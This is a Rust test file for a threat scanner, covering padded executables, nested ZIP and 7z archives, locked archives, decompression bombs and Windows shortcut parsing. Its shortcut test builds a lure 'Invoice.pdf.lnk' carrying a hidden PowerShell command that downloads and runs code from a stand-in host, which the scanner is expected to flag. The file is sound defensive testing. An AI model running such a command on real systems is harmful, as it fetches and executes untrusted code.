use super::*;
use crate::engine::{Engine, EngineConfig};
use std::io::Write;

fn marker() -> String {
    "threat-scanner-test-marker-7f3a".to_ascii_uppercase()
}

fn options() -> Options {
    Options { max_size: 1 << 20, archives: true }
}

fn ping() -> Vec<u8> {
    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    std::fs::read(Path::new(&root).join(r"System32\PING.EXE")).unwrap()
}

fn threats(v: &Verdict) -> Vec<&str> {
    v.findings.iter().map(|f| f.threat.as_str()).collect()
}

fn zip_of(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    for (name, body) in files {
        w.start_file(*name, opts).unwrap();
        w.write_all(body).unwrap();
    }
    w.finish().unwrap().into_inner()
}

#[cfg(windows)]
#[test]
fn a_padded_program_is_scanned_without_its_padding() {
    let program = ping();
    let image_end = pe_image_end(&program).unwrap();
    assert!(image_end > 0 && image_end <= program.len() as u64);

    // The hash list knows the program, not the padded file.
    let tmp = tempfile::tempdir().unwrap();
    let hashes = tmp.path().join("hashes.txt");
    let program_sha = hex::encode(Sha256::digest(&program));
    std::fs::write(&hashes, format!("{program_sha} malware Test.Padded\n")).unwrap();
    let engine = Engine::new(&EngineConfig { hash_files: vec![hashes], ..Default::default() }).unwrap();
    let mut scanner = engine.scanner();
    let mut padded = program.clone();
    padded.resize(program.len() + 12 * 1024 * 1024, 0);

    // In memory (within the size limit).
    let big = Options { max_size: 64 << 20, archives: true };
    let v = examine(&mut scanner, &padded, &big);
    assert_eq!(threats(&v), ["Test.Padded", "Suspicious.PaddedExecutable"]);

    // On disk, over the size limit: only the program is read.
    let file = tmp.path().join("setup.exe");
    std::fs::write(&file, &padded).unwrap();
    let examined = examine_file(&mut scanner, &file, &options()).unwrap().expect("padded programs are not skipped");
    assert_eq!(threats(&examined.verdict), ["Test.Padded", "Suspicious.PaddedExecutable"]);
    assert_eq!(examined.bytes, image_end);
    assert!(examined.data.is_none());
    assert_eq!(examined.verdict.sha256, hex::encode(Sha256::digest(&padded)), "the file on disk is what is recorded");

    // Large files that are not padded programs are still skipped.
    let noise: Vec<u8> = (0..(2u32 << 20)).map(|i| (i.wrapping_mul(2_654_435_761) >> 13) as u8).collect();
    let mut packed = program.clone();
    packed.extend_from_slice(&noise);
    std::fs::write(&file, &packed).unwrap();
    assert!(examine_file(&mut scanner, &file, &Options { max_size: 1 << 10, archives: true }).unwrap().is_none());
    std::fs::write(&file, vec![b'x'; 2 << 20]).unwrap();
    assert!(examine_file(&mut scanner, &file, &options()).unwrap().is_none());
}

#[test]
fn padding_is_told_apart_from_data() {
    assert!(looks_like_padding(&vec![0u8; 10_000]));
    assert!(looks_like_padding(&b"ab".repeat(5_000)), "a short repeated pattern");
    let noise: Vec<u8> = (0..10_000u32).map(|i| (i.wrapping_mul(2_654_435_761) >> 13) as u8).collect();
    assert!(!looks_like_padding(&noise));
    assert!(pe_image_end(b"MZ but not a program").is_none());
}

#[test]
fn archive_members_are_scanned_with_their_path() {
    let engine = Engine::new(&EngineConfig::default()).unwrap();
    let mut scanner = engine.scanner();
    let bad = format!("x {} y", marker());
    let inner = zip_of(&[("readme.txt", b"fine"), ("payload.txt", bad.as_bytes())]);
    let outer = zip_of(&[("notes.txt", b"fine"), ("inner.zip", &inner)]);

    let v = examine(&mut scanner, &outer, &options());
    assert_eq!(threats(&v), ["Test.ThreatScanner.Marker"]);
    assert!(v.findings[0].details.ends_with("inside inner.zip > payload.txt"), "{}", v.findings[0].details);

    // Turned off, only the archive's own bytes are scanned.
    let off = Options { archives: false, ..options() };
    assert!(examine(&mut scanner, &outer, &off).findings.is_empty());

    // 7z too.
    let mut w = sevenz_rust2::ArchiveWriter::new(Cursor::new(Vec::new())).unwrap();
    w.push_archive_entry(sevenz_rust2::ArchiveEntry::new_file("docs/payload.txt"), Some(bad.as_bytes())).unwrap();
    let sevenz = w.finish().unwrap().into_inner();
    let v = examine(&mut scanner, &sevenz, &options());
    assert_eq!(threats(&v), ["Test.ThreatScanner.Marker"]);
    assert!(v.findings[0].details.ends_with("inside docs/payload.txt"), "{}", v.findings[0].details);
}

#[test]
fn password_protected_programs_and_bombs_are_reported() {
    let engine = Engine::new(&EngineConfig::default()).unwrap();
    let mut scanner = engine.scanner();

    // Mark a member encrypted (general-purpose flag bit 0) in the local and
    // central headers, as a password-protected ZIP has it.
    let mut locked = zip_of(&[("invoice.pdf.exe", b"MZ...")]);
    let local = 0;
    let central = (0..locked.len() - 4).find(|&i| locked[i..i + 4] == *b"PK\x01\x02").unwrap();
    locked[local + 6] |= 1;
    locked[central + 8] |= 1;
    let v = examine(&mut scanner, &locked, &options());
    assert_eq!(threats(&v), ["Suspicious.LockedArchive"]);
    // Documents behind a password are normal.
    let mut letters = zip_of(&[("letter.pdf", b"%PDF")]);
    let central = (0..letters.len() - 4).find(|&i| letters[i..i + 4] == *b"PK\x01\x02").unwrap();
    letters[6] |= 1;
    letters[central + 8] |= 1;
    assert!(examine(&mut scanner, &letters, &options()).findings.is_empty());

    // 40 MB of zeros packs to a few dozen KB: not unpacked.
    let zeros = vec![0u8; 40 << 20];
    let bomb = zip_of(&[("zeros.bin", &zeros)]);
    let big = Options { max_size: 64 << 20, archives: true };
    let v = examine(&mut scanner, &bomb, &big);
    assert!(v.findings.is_empty());
    assert!(v.warnings.iter().any(|w| w.contains("decompression bomb")), "{:?}", v.warnings);
}

/// A minimal shortcut: a relative path to `target`, with `arguments`.
fn shortcut(target: &str, arguments: &str) -> Vec<u8> {
    let mut lnk = LNK_HEADER.to_vec();
    lnk.resize(0x4C, 0);
    let flags: u32 = 0x8 | 0x20 | 0x80;
    lnk[0x14..0x18].copy_from_slice(&flags.to_le_bytes());
    for text in [target, arguments] {
        let units: Vec<u16> = text.encode_utf16().collect();
        lnk.extend_from_slice(&(units.len() as u16).to_le_bytes());
        lnk.extend(units.iter().flat_map(|u| u.to_le_bytes()));
    }
    lnk.extend_from_slice(&[0; 4]);
    lnk
}

#[test]
fn shortcuts_are_checked_with_the_command_line_rules() {
    let engine = Engine::new(&EngineConfig::default()).unwrap();
    let mut scanner = engine.scanner();
    let powershell = r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

    let lnk = shortcut(powershell, "-w hidden -c iex(irm https://x.test/a)");
    assert_eq!(parse_shortcut(&lnk), Some(Shortcut { target: Some(powershell.into()), arguments: "-w hidden -c iex(irm https://x.test/a)".into() }));
    let v = examine(&mut scanner, &lnk, &options());
    assert_eq!(threats(&v), ["Suspicious.Shortcut.powershell.download-run"]);

    let hidden = shortcut(r"C:\Windows\System32\cmd.exe", &format!("{}/c start x", " ".repeat(200)));
    assert_eq!(threats(&examine(&mut scanner, &hidden, &options())), ["Suspicious.Shortcut.shortcut.hidden-arguments"]);

    // An ordinary shortcut, and one inside a ZIP (the usual delivery).
    assert!(examine(&mut scanner, &shortcut(r"C:\Program Files\App\app.exe", "--profile 1"), &options()).findings.is_empty());
    let zipped = zip_of(&[("Invoice.pdf.lnk", &lnk)]);
    let v = examine(&mut scanner, &zipped, &options());
    assert_eq!(threats(&v), ["Suspicious.Shortcut.powershell.download-run"]);
    assert!(v.findings[0].details.ends_with("inside Invoice.pdf.lnk"));
}

#[cfg(windows)]
#[test]
fn real_start_menu_shortcuts_parse() {
    let root = std::env::var("ProgramData").unwrap_or_else(|_| r"C:\ProgramData".into());
    let menu = Path::new(&root).join(r"Microsoft\Windows\Start Menu\Programs");
    let links: Vec<_> = walkdir::WalkDir::new(&menu)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| e.path().extension().is_some_and(|x| x.eq_ignore_ascii_case("lnk")))
        .take(40)
        .collect();
    if links.is_empty() {
        return;
    }
    let parsed = links.iter().filter(|e| parse_shortcut(&std::fs::read(e.path()).unwrap()).is_some_and(|s| s.target.is_some())).count();
    assert!(parsed * 2 >= links.len(), "{parsed} of {} shortcuts had a target", links.len());
}
